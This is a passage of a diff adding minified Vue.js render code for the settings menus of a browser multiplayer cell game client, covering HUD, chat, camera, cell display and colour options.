+                        }
+                    }, [e._v("Auto respawn")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            checked: e.mbAutorespawn
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("mbAutorespawn", t)
+                            }
+                        }
+                    }, [e._v("Multibox auto respawn")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            checked: e.showCellLines
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("showCellLines", t)
+                            }
+                        }
+                    }, [e._v("Show cell lines")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            checked: e.showTag
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("showTag", t)
+                            }
+                        }
+                    }, [e._v("Show team")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            checked: e.showDir
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("showDir", t)
+                            }
+                        }
+                    }, [e._v("(BETA) Show direction")]), e._v(" "), s("div", {
+                        staticClass: "slider-option"
+                    }, [e._v("\n                Draw delay "), s("span", {
+                        staticClass: "right"
+                    }, [e._v(e._s(e.drawDelay) + "ms")]), e._v(" "), s("input", {
+                        staticClass: "slider draw-delay",
+                        attrs: {
+                            type: "range",
+                            min: "0",
+                            max: "1000",
+                            step: "10"
+                        },
+                        domProps: {
+                            value: e.drawDelay
+                        },
+                        on: {
+                            input: function(t) {
+                                return e.change("drawDelay", t)
+                            }
+                        }
+                    })]), e._v(" "),
+                    
+                    s("div", {
+                        staticClass: "slider-option"
+                    },
+                    [e._v("\n                Dual camera switch distance "), s("span", {
+                        staticClass: "right"
+                    }, [e._v(e._s(e.switchDistance))]), e._v(" "), s("input", {
+                        staticClass: "slider draw-delay",
+                        attrs: {
+                            type: "range",
+                            min: "0",
+                            max: "30",
+                            step: "1"
+                        },
+                        domProps: {
+                            value: e.switchDistance
+                        },
+                        on: {
+                            input: function(t) {
+                                return e.change("switchDistance", t)
+                            }
+                        }
+                    })]), e._v(" "),
+                    
+                    
+                    s("div", {
+                        staticClass: "slider-option"
+                    }, [e._v("\n            Camera panning delay "), s("span", {
+                        staticClass: "right"
+                    }, [e._v(e._s(e.cameraMoveDelay) + "ms")]), e._v(" "), s("input", {
+                        staticClass: "slider",
+                        attrs: {
+                            type: "range",
+                            min: "0",
+                            max: "1500",
+                            step: "10"
+                        },
+                        domProps: {
+                            value: e.cameraMoveDelay
+                        },
+                        on: {
+                            input: function(t) {
+                                return e.change("cameraMoveDelay", t)
+                            }
+                        }
+                    })]), e._v(" "), s("div", {
+                        staticClass: "slider-option"
+                    }, [e._v("\n            Camera zooming delay "), s("span", {
+                        staticClass: "right"
+                    }, [e._v(e._s(e.cameraZoomDelay) + "ms")]), e._v(" "), s("input", {
+                        staticClass: "slider",
+                        attrs: {
+                            type: "range",
+                            min: "0",
+                            max: "1500",
+                            step: "10"
+                        },
+                        domProps: {
+                            value: e.cameraZoomDelay
+                        },
+                        on: {
+                            input: function(t) {
+                                return e.change("cameraZoomDelay", t)
+                            }
+                        }
+                    })]), e._v(" "), s("div", {
+                        staticClass: "slider-option"
+                    }, [e._v("\n            Scroll zoom rate "), s("span", {
+                        staticClass: "right"
+                    }, [e._v(e._s((e.cameraZoomSpeed / 10 * 100).toFixed(0)) + "%")]), e._v(" "), s("input", {
+                        staticClass: "slider",
+                        attrs: {
+                            type: "range",
+                            min: "1",
+                            max: "25",
+                            step: "1"
+                        },
+                        domProps: {
+                            value: e.cameraZoomSpeed
+                        },
+                        on: {
+                            input: function(t) {
+                                return e.change("cameraZoomSpeed", t)
+                            }
+                        }
+                    })]), e._v(" "), s("div", {
+                        staticClass: "slider-option"
+                    }, [e._v("\n            Cells transparency "), s("span", {
+                        staticClass: "right"
+                    }, [e._v(e._s(100 * e.gameAlpha) + "%")]), e._v(" "), s("input", {
+                        staticClass: "slider",
+                        attrs: {
+                            type: "range",
+                            min: "0.1",
+                            max: "1",
+                            step: "0.05"
+                        },
+                        domProps: {
+                            value: e.gameAlpha
+                        },
+                        on: {
+                            input: function(t) {
+                                return e.change("gameAlpha", t)
+                            }
+                        }
+                    })]), e._v(" "), s("div", {
+                        staticClass: "slider-option"
+                    }, [e._v("\n            Replay duration "), s("span", {
+                        staticClass: "right"
+                    }, [e._v(e._s(e.replayDuration) + " seconds")]), e._v(" "), s("input", {
+                        staticClass: "slider",
+                        attrs: {
+                            type: "range",
+                            min: "1",
+                            max: "15",
+                            step: "1"
+                        },
+                        domProps: {
+                            value: e.replayDuration
+                        },
+                        on: {
+                            input: function(t) {
+                                return e.change("replayDuration", t)
+                            }
+                        }
+                    })]), e._v(" "), s("div", {
+                        staticClass: "inline-range",
+                        class: {
+                            off: !e.showReplaySaved
+                        }
+                    }, [s("input", {
+                        staticClass: "slider",
+                        attrs: {
+                            type: "range",
+                            min: "0",
+                            max: "2",
+                            step: "1"
+                        },
+                        domProps: {
+                            value: e.showReplaySaved
+                        },
+                        on: {
+                            input: function(t) {
+                                return e.change("showReplaySaved", t)
+                            }
+                        }
+                    }), e._v('\n            "Replay saved" ' + e._s(e.showReplaySavedMeaning) + "\n        ")])], 1)]), e._v(" "), s("div", {
+                        staticClass: "section row"
+                    }, [s("div", {
+                        staticClass: "header"
+                    }, [e._v("\n            Cells\n        ")]), e._v(" "), s("div", {
+                        staticClass: "options"
+                    }, [s("div", {
+                        staticClass: "inline-range",
+                        class: {
+                            off: !e.showNames
+                        }
+                    }, [s("input", {
+                        staticClass: "slider",
+                        attrs: {
+                            type: "range",
+                            min: "0",
+                            max: "2",
+                            step: "1"
+                        },
+                        domProps: {
+                            value: e.showNames
+                        },
+                        on: {
+                            input: function(t) {
+                                return e.change("showNames", t)
+                            }
+                        }
+                    }), e._v("\n            Show " + e._s(e.showNamesMeaning) + " names\n            ")]), e._v(" "), s("div", {
+                        staticClass: "inline-range",
+                        class: {
+                            off: !e.showSkins
+                        }
+                    }, [s("input", {
+                        staticClass: "slider",
+                        attrs: {
+                            type: "range",
+                            min: "0",
+                            max: "2",
+                            step: "1"
+                        },
+                        domProps: {
+                            value: e.showSkins
+                        },
+                        on: {
+                            input: function(t) {
+                                return e.change("showSkins", t)
+                            }
+                        }
+                    }), e._v("\n            Show " + e._s(e.showSkinsMeaning) + " skins\n        ")]), e._v(" "), s("div", {
+                        staticClass: "inline-range",
+                        class: {
+                            off: !e.showMass
+                        }
+                    }, [s("input", {
+                        staticClass: "slider",
+                        attrs: {
+                            type: "range",
+                            min: "0",
+                            max: "2",
+                            step: "1"
+                        },
+                        domProps: {
+                            value: e.showMass
+                        },
+                        on: {
+                            input: function(t) {
+                                return e.change("showMass", t)
+                            }
+                        }
+                    }), e._v("\n            Show " + e._s(e.showMassMeaning) + " mass\n        ")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            checked: e.showOwnName
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("showOwnName", t)
+                            }
+                        }
+                    }, [e._v("Show my own name")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            checked: e.showOwnSkin
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("showOwnSkin", t)
+                            }
+                        }
+                    }, [e._v("Show my own skin")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            checked: e.showOwnMass
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("showOwnMass", t)
+                            }
+                        }
+                    }, [e._v("Show my own mass")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            checked: e.showCrown
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("showCrown", t)
+                            }
+                        }
+                    }, [e._v("Show crown")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            checked: e.foodVisible
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("foodVisible", t)
+                            }
+                        }
+                    }, [e._v("Show food")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            checked: e.eatAnimation
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("eatAnimation", t)
+                            }
+                        }
+                    }, [e._v("Show eat animation")])], 1)]), e._v(" "), s("div", {
+                        staticClass: "section row"
+                    }, [s("div", {
+                        staticClass: "header"
+                    }, [s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            checked: e.showHud
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("showHud", t)
+                            }
+                        }
+                    }, [e._v("HUD")])], 1), e._v(" "), s("div", {
+                        staticClass: "options"
+                    }, [s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            disabled: !e.showHud,
+                            checked: e.showLeaderboard
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("showLeaderboard", t)
+                            }
+                        }
+                    }, [e._v("Show leaderboard")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            disabled: !e.showHud,
+                            checked: e.showServerName
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("showServerName", t)
+                            }
+                        }
+                    }, [e._v("Leaderboard: Server name")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            disabled: !e.showHud,
+                            checked: e.showChat
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("showChat", t)
+                            }
+                        }
+                    }, [e._v("Show chat")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            disabled: !e.showHud || !e.showChat,
+                            checked: e.showChatToast
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("showChatToast", t)
+                            }
+                        }
+                    }, [e._v("Show chat as popups")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            disabled: !e.showHud,
+                            checked: e.minimapEnabled
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("minimapEnabled", t)
+                            }
+                        }
+                    }, [e._v("Show minimap")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            disabled: !e.showHud,
+                            checked: e.minimapLocations
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("minimapLocations", t)
+                            }
+                        }
+                    }, [e._v("Show minimap locations")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            disabled: !e.showHud,
+                            checked: e.showFPS
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("showFPS", t)
+                            }
+                        }
+                    }, [e._v("Stats: FPS")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            disabled: !e.showHud,
+                            checked: e.showPing
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("showPing", t)
+                            }
+                        }
+                    }, [e._v("Stats: Ping")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            disabled: !e.showHud,
+                            checked: e.showPlayerMass
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("showPlayerMass", t)
+                            }
+                        }
+                    }, [e._v("Stats: Current mass")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            disabled: !e.showHud,
+                            checked: e.showPlayerScore
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("showPlayerScore", t)
+                            }
+                        }
+                    }, [e._v("Stats: Score")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            disabled: !e.showHud,
+                            checked: e.showCellCount
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("showCellCount", t)
+                            }
+                        }
+                    }, [e._v("Stats: Cell count")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            disabled: !e.showHud,
+                            checked: e.showClock
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("showClock", t)
+                            }
+                        }
+                    }, [e._v("Minimap stats: System time")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            disabled: !e.showHud,
+                            checked: e.showSessionTime
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("showSessionTime", t)
+                            }
+                        }
+                    }, [e._v("Minimap stats: Session time")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            disabled: !e.showHud,
+                            checked: e.showPlayerCount
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("showPlayerCount", t)
+                            }
+                        }
+                    }, [e._v("Minimap stats: Players in server")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            disabled: !e.showHud,
+                            checked: e.showSpectators
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("showSpectators", t)
+                            }
+                        }
+                    }, [e._v("Minimap stats: Spectators")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            disabled: !e.showHud,
+                            checked: e.showRestartTiming
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("showRestartTiming", t)
+                            }
+                        }
+                    }, [e._v("Minimap stats: Server restart time")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            checked: e.chatColorOnlyPeople
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("chatColorOnlyPeople", t)
+                            }
+                        }
+                    }, [e._v("Chat: Only colored name people")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            checked: e.playerStats
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("playerStats", t)
+                            }
+                        }
+                    }, [e._v("Player tracker")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            checked: e.debugStats
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("debugStats", t)
+                            }
+                        }
+                    }, [e._v("Network info")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            checked: e.clientStats
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("clientStats", t)
+                            }
+                        }
+                    }, [e._v("Client info")])], 1)]), e._v(" "), s("div", {
+                        staticClass: "section row"
+                    }, [s("div", {
+                        staticClass: "header"
+                    }, [e._v("\n        Chat\n    ")]), e._v(" "), s("div", {
+                        staticClass: "options"
+                    }, [s("div", {
+                        staticClass: "row"
+                    }, [e._v("\n                You can right-click name in chat to block them until server restart\n            ")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            checked: e.showBlockedMessageCount
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("showBlockedMessageCount", t)
+                            }
+                        }
+                    }, [e._v("\n            Show blocked message count")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            checked: e.filterChatMessages
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("filterChatMessages", t)
+                            }
+                        }
+                    }, [e._v("\n            Filter profanity")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            checked: e.clearChatMessages
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("clearChatMessages", t)
+                            }
+                        }
+                    }, [e._v("\n            Clear on disconnect")])], 1)]), e._v(" "), s("div", {
+                        staticClass: "reset-option-wrapper"
+                    }, [s("span", {
+                        staticClass: "reset-option",
+                        on: {
+                            click: function() {
+                                return e.confirmReset()
+                            }
+                        }
+                    }, [s("i", {
+                        staticClass: "fa fa-undo"
+                    }), e._v(" Reset\n        ")])])])
+                };
+            I._withStripped = !0;
+            var k = s(1),
+                b = s(4),
+                _ = s(5),
+                S = PIXI.utils.isWebGLSupported(),
+                E = S && b.useWebGL;
+
+            function x(e) {
+                switch (e) {
+                    case 0:
+                        return "nobody else's";
+                    case 1:
+                        return "tag players'";
+                    case 2:
+                        return "everybody's";
+                    default:
+                        return "???"
+                }
+            }
+            var B = (s(170), Object(v.a)({
+                data: () => ({
+                    clientHash: "",
+                    isWebGLSupported: S,
+                    useWebGL: E,
+                    gameResolution: b.gameResolution,
+                    smallTextThreshold: b.smallTextThreshold,
+                    autoZoom: b.autoZoom,
+                    rememeberEjecting: b.rememeberEjecting,
+                    autoRespawn: b.autoRespawn,
+                    mbAutorespawn: b.mbAutorespawn,
+                    mouseFreezeSoft: b.mouseFreezeSoft,
+                    drawDelay: b.drawDelay,
+                    switchDistance: b.switchDistance,
+                    cameraMoveDelay: b.cameraMoveDelay,
+                    cameraZoomDelay: b.cameraZoomDelay,
+                    cameraZoomSpeed: b.cameraZoomSpeed,
+                    replayDuration: b.replayDuration,
+                    showReplaySaved: b.showReplaySaved,
+                    showNames: b.showNames,
+                    showMass: b.showMass,
+                    showSkins: b.showSkins,
+                    showOwnName: b.showOwnName,
+                    showOwnMass: b.showOwnMass,
+                    showOwnSkin: b.showOwnSkin,
+                    showCrown: b.showCrown,
+                    foodVisible: b.foodVisible,
+                    eatAnimation: b.eatAnimation,
+                    showHud: b.showHud,
+                    showLeaderboard: b.showLeaderboard,
+                    showServerName: b.showServerName,
+                    showChat: b.showChat,
+                    showChatToast: b.showChatToast,
+                    minimapEnabled: b.minimapEnabled,
+                    minimapLocations: b.minimapLocations,
+                    showFPS: b.showFPS,
+                    showPing: b.showPing,
+                    showCellCount: b.showCellCount,
+                    showPlayerScore: b.showPlayerScore,
+                    showPlayerMass: b.showPlayerMass,
+                    showClock: b.showClock,
+                    showSessionTime: b.showSessionTime,
+                    showPlayerCount: b.showPlayerCount,
+                    showSpectators: b.showSpectators,
+                    showRestartTiming: b.showRestartTiming,
+                    debugStats: b.debugStats,
+                    clientStats: b.clientStats,
+                    playerStats: b.playerStats,
+                    chatColorOnlyPeople: b.chatColorOnlyPeople,
+                    showBlockedMessageCount: b.showBlockedMessageCount,
+                    filterChatMessages: b.filterChatMessages,
+                    clearChatMessages: b.clearChatMessages,
+                    showCellLines: b.showCellLines,
+                    showTag: b.showTag,
+                    showDir: b.showDir,
+                    gameAlpha: b.gameAlpha,
+                    mbActive: b.mbActive
+                }),
+                computed: {
+                    showNamesMeaning() {
+                        return x(this.showNames)
+                    },
+                    showSkinsMeaning() {
+                        return x(this.showSkins)
+                    },
+                    showMassMeaning() {
+                        return x(this.showMass)
+                    },
+                    showReplaySavedMeaning() {
+                        switch (this.showReplaySaved) {
+                            case 0:
+                                return "nowhere";
+                            case 1:
+                                return "in chat only";
+                            case 2:
+                                return "as notification";
+                            default:
+                                return "???"
+                        }
+                    },
+                    showMultiboxMeaning() {
+                        return ({
+                            0: "None",
+                            1: "Border",
+                            2: "Arrow",
+                            3: "Arrow"
+                        })[this.mbActive]
+                    }
+                },
+                methods: {
+                    promptRestart() {
+                        _.confirm("Refresh page to apply changes?", () => {
+                            setTimeout(() => {
+                                location.reload()
+                            }, 500)
+                        })
+                    },
+                    change(e, t) {
+                        var s;
+                        if (s = t && t.target ? isNaN(t.target.valueAsNumber) ? t.target.value : t.target.valueAsNumber : t, b[e] != s) {
+                            switch (this[e] = s, b.set(e, s), e) {
+                                case "backgroundColor":
+                                    var i = PIXI.utils.string2hex(s);
+                                    k.renderer.backgroundColor = i;
+                                    break;
+                                case "minimapLocations":
+                                    k.events.$emit("minimap-show-locations", s);
+                                    break;
+                                case "showHud":
+                                    k.app.showHud = s;
+                                    break;
+                                case "showChatToast":
+                                    k.events.$emit("chat-visible", {
+                                        visibleToast: s
+                                    })
+                            }
+                            if (k.running) switch (e) {
+                                case "showNames":
+                                case "showSkins":
+                                case "showMass":
+                                case "showOwnName":
+                                case "showOwnSkin":
+                                case "showOwnMass":
+                                    k.playerManager.invalidateVisibility();
+                                    break;
+                                case "gameAlpha":
+                                    GAME.scene.container.alpha = s;
+                                    break;
+                                case "foodVisible":
+                                    k.scene.food.visible = s;
+                                    break;
+                                case "showLeaderboard":
+                                    k.events.$emit("leaderboard-visible", s);
+                                    break;
+                                case "minimapEnabled":
+                                    s ? k.events.$emit("minimap-show") : k.events.$emit("minimap-hide");
+                                    break;
+                                case "showFPS":
+                                case "showPing":
+                                case "showPlayerMass":
+                                case "showPlayerScore":
+                                case "showCellCount":
+                                    k.events.$emit("stats-invalidate-shown");
+                                    break;
+                                case "showClock":
+                                case "showSessionTime":
+                                case "showSpectators":
+                                case "showPlayerCount":
+                                case "showRestartTiming":
+                                    k.events.$emit("minimap-stats-invalidate-shown");
+                                    break;
+                                case "showChat":
+                                    k.events.$emit("chat-visible", {
+                                        visible: s
+                                    });
+                                    break;
+                                case "showBlockedMessageCount":
+                                    k.events.$emit("show-blocked-message-count", s)
+                            }
+                        }
+                    },
+                    confirmReset() {
+                        _.confirm("Are you sure you want to reset all setting options?", () => this.reset())
+                    },
+                    reset() {
+                        var e = ["clientHash", "isWebGLSupported"];
+                        for (var t in this.$data) e.includes(t) || this.change(t, b.getDefault(t))
+                    }
+                }
+            }, I, [], !1, null, "3ddebeb3", null));
+            B.options.__file = "src/components/settings.vue";
+            var Q = B.exports,
+                M = function() {
+                    var e = this,
+                        t = e.$createElement,
+                        s = e._self._c || t;
+                    return s("div", {
+                        staticClass: "container"
+                    }, [s("div", {
+                        staticClass: "section row"
+                    }, [s("div", {
+                        staticClass: "header"
+                    }, [e._v("\n        Colors and images\n    ")]), e._v(" "), s("div", {
+                        staticClass: "options two-columns"
+                    }, [s("span", [s("div", {
+                        staticClass: "color-input"
+                    }, [s("span", [e._v("Background")]), e._v(" "), s("color-option", {
+                        staticClass: "right",
+                        attrs: {
+                            value: e.backgroundColor
+                        },
+                        on: {
+                            input: function(t) {
+                                return e.change("backgroundColor", t)
+                            }
+                        }
+                    })], 1), e._v(" "), s("div", {
+                        staticClass: "color-input"
+                    }, [s("span", [e._v("Map border")]), e._v(" "), s("color-option", {
+                        staticClass: "right",
+                        attrs: {
+                            value: e.borderColor
+                        },
+                        on: {
+                            input: function(t) {
+                                return e.change("borderColor", t)
+                            }
+                        }
+                    })], 1), e._v(" "), s("div", {
+                        staticClass: "color-input",
+                        class: {
+                            disabled: !e.useFoodColor
+                        }
+                    }, [s("span", [e._v("Food")]), e._v(" "), s("color-option", {
+                        staticClass: "right",
+                        attrs: {
+                            disabled: !e.useFoodColor,
+                            value: e.foodColor
+                        },
+                        on: {
+                            input: function(t) {
+                                return e.change("foodColor", t)
+                            }
+                        }
+                    })], 1), e._v(" "), s("div", {
+                        staticClass: "color-input"
+                    }, [s("span", [e._v("Ejected cells")]), e._v(" "), s("color-option", {
+                        staticClass: "right",
+                        attrs: {
+                            value: e.ejectedColor
+                        },
+                        on: {
+                            input: function(t) {
+                                return e.change("ejectedColor", t)
+                            }
+                        }
+                    })], 1), e._v(" "), s("div", {
+                        staticClass: "color-input"
+                    }, [s("span", [e._v("Active cell")]), e._v(" "), s("color-option", {
+                        staticClass: "right",
+                        attrs: {
+                            value: e.mbColor
+                        },
+                        on: {
+                            input: function(t) {
+                                return e.change("mbColor", t)
+                            }
+                        }
+                    })], 1), e._v(" "), s("div", {
+                        staticClass: "color-input"
+                    }, [s("span", [e._v("Name outline")]), e._v(" "), s("color-option", {
+                        staticClass: "right",
+                        attrs: {
+                            value: e.cellNameOutlineColor
+                        },
+                        on: {
+                            input: function(t) {
+                                return e.change("cellNameOutlineColor", t)
+                            }
+                        }
+                    })], 1)]), e._v(" "), s("span", [s("div", {
+                        staticClass: "color-input"
+                    }, [s("span", [e._v("Cursor")]), e._v(" "), s("image-option", {
+                        staticClass: "right",
+                        attrs: {
+                            width: "32",
+                            defaults: "",
+                            value: e.cursorImageUrl
+                        },
+                        on: {
+                            input: function(t) {
+                                return e.change("cursorImageUrl", t)
+                            }
+                        }
+                    })], 1), e._v(" "), s("div", {
+                        staticClass: "color-input",
+                        class: {
+                            disabled: !e.showBackgroundImage
+                        }
+                    }, [s("span", [e._v("Map image")]), e._v(" "), s("image-option", {
+                        staticClass: "right",
+                        attrs: {
+                            width: "330",
+                            defaults: e.bgDefault,
+                            disabled: !e.showBackgroundImage,
+                            value: e.backgroundImageUrl
+                        },
+                        on: {
+                            input: function(t) {
+                                return e.change("backgroundImageUrl", t)
+                            }
+                        }
+                    })], 1), e._v(" "), s("div", {
+                        staticClass: "color-input"
+                    }, [s("span", [e._v("Viruses")]), e._v(" "), s("image-option", {
+                        staticClass: "right",
+                        attrs: {
+                            width: "100",
+                            defaults: e.virusDefault,
+                            value: e.virusImageUrl
+                        },
+                        on: {
+                            input: function(t) {
+                                return e.change("virusImageUrl", t)
+                            }
+                        }
+                    })], 1), e._v(" "), s("div", {
+                        staticClass: "color-input"
+                    }, [s("span", [e._v("Multi arrow")]), e._v(" "), s("image-option", {
+                        staticClass: "right",
+                        attrs: {
+                            width: "100",
+                            defaults: e.mbArrowDefault,
+                            value: e.mbArrow
+                        },
+                        on: {
+                            input: function(t) {
+                                return e.change("mbArrow", t)
+                            }
+                        }
+                    })], 1), e._v(" "), s("div", {
+                        staticClass: "color-input"
+                    }, [s("span", [e._v("Mass text")]), e._v(" "), s("color-option", {
+                        staticClass: "right",
+                        attrs: {
+                            value: e.cellMassColor
+                        },
+                        on: {
+                            input: function(t) {
+                                return e.change("cellMassColor", t)
+                            }
+                        }
+                    })], 1), e._v(" "), s("div", {
+                        staticClass: "color-input"
+                    }, [s("span", [e._v("Mass outline")]), e._v(" "), s("color-option", {
+                        staticClass: "right",
+                        attrs: {
+                            value: e.cellMassOutlineColor
+                        },
+                        on: {
+                            input: function(t) {
+                                return e.change("cellMassOutlineColor", t)
+                            }
+                        }
+                    })], 1)])])]), e._v(" "), s("div", {
+                        staticClass: "section row"
+                    }, [s("div", {
+                        staticClass: "header"
+                    }, [e._v("\n        Map\n        "), e.useWebGL ? e._e() : s("span", {
+                        staticClass: "right silent"
+                    }, [e._v("Needs GPU rendering")])]), e._v(" "), s("div", {
+                        staticClass: "options"
+                    }, [s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            checked: e.useFoodColor
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("useFoodColor", t)
+                            }
+                        }
+                    }, [e._v("Custom food color")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            disabled: !e.useWebGL,
+                            checked: e.showBackgroundImage
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("showBackgroundImage", t)
+                            }
+                        }
+                    }, [e._v("Show map image")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            disabled: !e.useWebGL || !e.showBackgroundImage,
+                            checked: e.backgroundImageRepeat
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("backgroundImageRepeat", t)
+                            }
+                        }
+                    }, [e._v("Repeat map image")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            disabled: !e.useWebGL || !e.showBackgroundImage,
+                            checked: e.backgroundDefaultIfUnequal
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("backgroundDefaultIfUnequal", t)
+                            }
+                        }
+                    }, [e._v("Always crop map image")]), e._v(" "), s("div", {
+                        staticClass: "slider-option bottom-margin",
+                        class: {
+                            disabled: !e.useWebGL || !e.showBackgroundImage
+                        }
+                    }, [e._v("\n            Map image opacity "), s("span", {
+                        staticClass: "right"
+                    }, [e._v(e._s((100 * e.backgroundImageOpacity).toFixed(0)) + "%")]), e._v(" "), s("input", {
+                        staticClass: "slider",
+                        attrs: {
+                            type: "range",
+                            disabled: !e.useWebGL || !e.showBackgroundImage,
+                            min: "0.1",
+                            max: "1",
+                            step: "0.05"
+                        },
+                        domProps: {
+                            value: e.backgroundImageOpacity
+                        },
+                        on: {
+                            input: function(t) {
+                                return e.change("backgroundImageOpacity", t)
+                            }
+                        }
+                    })])], 1)]), e._v(" "), s("div", {
+                        staticClass: "section row"
+                    }, [s("div", {
+                        staticClass: "header"
+                    }, [e._v("\r\n            Name text\r\n        ")]), e._v(" "), s("div", {
+                        staticClass: "options"
+                    }, [s("div", {
+                        staticClass: "bottom-margin"
+                    }, [e._v("\n            Font\n            "), s("input", {
+                        attrs: {
+                            type: "text",
+                            spellcheck: "false",
+                            placeholder: "Hind Madurai",
+                            maxlength: "30"
+                        },
+                        domProps: {
+                            value: e.cellNameFont
+                        },
+                        on: {
+                            input: function(t) {
+                                return e.change("cellNameFont", t)
+                            },
+                            focus: function() {
+                                return e.fontWarning("name", !0)
+                            },
+                            blur: function() {
+                                return e.fontWarning("name", !1)
+                            }
+                        }
+                    })]), e._v(" "), e.showNameFontWarning ? [s("div", {
+                        staticClass: "silent"
+                    }, [e._v("It must be installed on your device.")]), e._v(" "), s("div", {
+                        staticClass: "silent"
+                    }, [e._v("If it still doesn't show, restart your PC")])] : e._e(), e._v(" "), s("div", {
+                        staticClass: "inline-range"
+                    }, [s("input", {
+                        staticClass: "slider",
+                        attrs: {
+                            type: "range",
+                            min: "0",
+                            max: "2",
+                            step: "1"
+                        },
+                        domProps: {
+                            value: e.cellNameWeight
+                        },
+                        on: {
+                            input: function(t) {
+                                return e.change("cellNameWeight", t)
+                            }
+                        }
+                    }), e._v("\n            " + e._s(e.cellNameWeightMeaning) + " name text\n        ")]), e._v(" "), s("div", {
+                        staticClass: "inline-range",
+                        class: {
+                            off: !e.cellNameOutline
+                        }
+                    }, [s("input", {
+                        staticClass: "slider",
+                        attrs: {
+                            type: "range",
+                            min: "0",
+                            max: "3",
+                            step: "1"
+                        },
+                        domProps: {
+                            value: e.cellNameOutline
+                        },
+                        on: {
+                            input: function(t) {
+                                return e.change("cellNameOutline", t)
+                            }
+                        }
+                    }), e._v("\n            " + e._s(e.cellNameOutlineMeaning) + " name outline\n        ")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            checked: e.cellNameSmoothOutline
+                        },
+                        on: {
+                            change: function(t) {
